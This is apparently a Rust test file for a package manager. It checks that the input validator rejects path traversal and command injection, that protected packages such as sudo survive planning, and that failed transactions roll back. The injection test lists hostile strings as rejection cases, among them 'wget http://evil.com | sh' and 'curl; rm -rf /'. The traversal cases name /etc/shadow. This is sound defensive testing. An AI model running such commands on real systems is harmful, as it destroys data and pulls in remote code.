// tests/security_and_resiliency_tests.rs

use linix::app::sync::planner::{ChangePlanner, ScopedFilter};
use linix::core::executor::DryRunOutput;
use linix::core::{Error, GraphAction, Transaction, TransactionConfig, Validator};
use std::collections::HashMap;

mod mock_providers;
use mock_providers::{create_dummy_spec, TestKernel};

// ============================================================================
// SECURITY VALIDATION TESTS (Validator Layer)
// ============================================================================

#[test]
fn test_validator_blocks_path_traversal_attempts() {
    let dangerous_names = vec![
        "../../etc/shadow",
        "..\\..\\windows\\system32",
        "pkg/../../tmp/evil",
        "../secret.txt",
        "/etc/passwd",
    ];

    for name in dangerous_names {
        let res = Validator::validate_package_name(name);
        assert!(
            res.is_err(),
            "Security Failure: Validator allowed traversal in: {}",
            name
        );
        if let Err(Error::Validation(msg)) = res {
            assert!(
                msg.contains("Path traversal") || msg.contains("Invalid characters"),
                "Error should identify security violation: {}",
                msg
            );
        }
    }
}

#[test]
fn test_validator_blocks_command_injection_syntax() {
    let dangerous_inputs = vec![
        "curl; rm -rf /",
        "wget http://evil.com | sh",
        "$(whoami)",
        "pkgname&sleep 10",
        "pkg`id`",
        "pkg > /dev/sda",
    ];

    for input in dangerous_inputs {
        let res = Validator::validate_package_name(input);
        assert!(
            res.is_err(),
            "Security Failure: Validator allowed injection in name: {}",
            input
        );

        let cmd_res = Validator::validate_command(input, &[]);
        assert!(
            cmd_res.is_err(),
            "Security Failure: Command validator allowed injection: {}",
            input
        );
    }
}

#[test]
fn test_validator_permits_safe_modern_names() {
    let safe_names = vec![
        "@scoped/package",
        "my-tool_v1.0.5",
        "github.com/linix/manager",
        "google-cloud-sdk",
        "dotnet-runtime-6.0",
    ];

    for name in safe_names {
        assert!(
            Validator::validate_package_name(name).is_ok(),
            "Validator incorrectly blocked legitimate name: {}",
            name
        );
    }
}

// ============================================================================
// RESILIENCY & INTEGRITY TESTS (Planner & Transaction Layer)
// ============================================================================

#[tokio::test]
async fn test_planner_protects_mission_critical_closure() {
    let kernel = TestKernel::new().await;

    {
        let mut state = kernel.state.lock().await;
        state.add("apt", "sudo", None, HashMap::new(), None, false);
        state.add(
            "apt",
            "linux-image-generic",
            None,
            HashMap::new(),
            None,
            false,
        );
    }

    let desired = HashMap::new();

    let mut config = (*kernel.app.config).clone();
    config.protected_packages.push("sudo".to_string());
    config
        .protected_packages
        .push("linux-image-generic".to_string());

    let state_guard = kernel.state.lock().await;
    let planner = ChangePlanner::new(kernel.app.registry.clone(), &state_guard, &config);

    let plan = planner
        .plan(&desired, ScopedFilter::None)
        .await
        .expect("Planning failed");

    for node in plan.graph.node_weights() {
        if let GraphAction::Remove { name, .. } = node {
            assert!(
                name != "sudo",
                "CRITICAL: Planner scheduled protected package 'sudo' for removal!"
            );
            assert!(
                !name.contains("linux-image"),
                "CRITICAL: Planner scheduled protected kernel for removal!"
            );
        }
    }
}

#[tokio::test]
async fn test_transaction_atomic_rollback_fidelity() {
    let kernel = TestKernel::new().await;

    let spec_a = create_dummy_spec("pkg-a", "brew", None);
    let spec_b = create_dummy_spec("pkg-b", "brew", None);

    kernel
        .mock_executor
        .set_response("brew install pkg-a", Ok(DryRunOutput::default().into()));
    kernel.mock_executor.set_response(
        "brew install pkg-b",
        Err(Error::CommandFailed("Network Timeout".into())),
    );
    kernel
        .mock_executor
        .set_response("brew uninstall pkg-a", Ok(DryRunOutput::default().into()));

    let mut graph = petgraph::stable_graph::StableDiGraph::new();
    let a = graph.add_node(GraphAction::Install(spec_a));
    let b = graph.add_node(GraphAction::Install(spec_b));
    graph.add_edge(a, b, ());

    let mut tx = Transaction::with_config(
        graph,
        kernel.app.registry.clone(),
        kernel.app.journal.clone(),
        kernel.app.diagnostics.clone(),
        TransactionConfig::quick(),
    );

    let result = tx.execute().await;

    assert!(
        result.is_err(),
        "Transaction should have reported failure when dependency B failed"
    );

    let calls: Vec<String> = kernel.mock_executor.get_calls().await;

    assert!(calls.iter().any(|c| c.contains("install pkg-a")));
    assert!(calls.iter().any(|c| c.contains("install pkg-b")));
    assert!(
        calls.iter().any(|c| c.contains("uninstall pkg-a")),
        "Integrity Failure: Node A was not reverted after B failed. Log: {:?}",
        calls
    );
}

#[tokio::test]
async fn test_journal_wal_healing_logic() {
    let kernel = TestKernel::new().await;

    {
        let mut j = kernel.app.journal.lock().await;
        let spec = create_dummy_spec("stuck-component", "brew", None);
        let _ = j.record_start(linix::core::journal::JournalAction::Install(spec));
    }

    kernel.mock_executor.set_response(
        "brew uninstall stuck-component",
        Ok(DryRunOutput::default().into()),
    );
    kernel.mock_executor.set_response(
        "brew install stuck-component",
        Ok(DryRunOutput::default().into()),
    );

    let sync_engine = kernel.app.sync_engine().await;
    sync_engine.heal().await.expect("Healing procedure failed");

    let j_after = kernel.app.journal.lock().await;
    assert!(
        !j_after.needs_recovery(),
        "Journal indicates recovery still needed after successful heal reconciliation"
    );
}

// ============================================================================
// PARSER & RESOLVER ROBUSTNESS
// ============================================================================

#[tokio::test]
async fn test_resolver_malformed_input_resiliency() {
    let kernel = TestKernel::new().await;
    let resolver = linix::app::sync::resolver::StateResolver::new(
        &kernel.app.config,
        kernel.app.registry.clone(),
        false,
    )
    .await;

    let malformed_inputs = vec![
        "apt:",               // Incomplete identity
        ":curl",              // Missing backend
        "brew@version",       // Option segment with no value
        "@@@@",               // Invalid grammar
        "brew:vim@requires=", // Null requirement set
    ];

    for input in malformed_inputs {
        let res = resolver.parse_and_probe_spec(input).await;
        if let Ok(spec) = res {
            Validator::validate_package_name(&spec.name).ok();
        }
    }
}
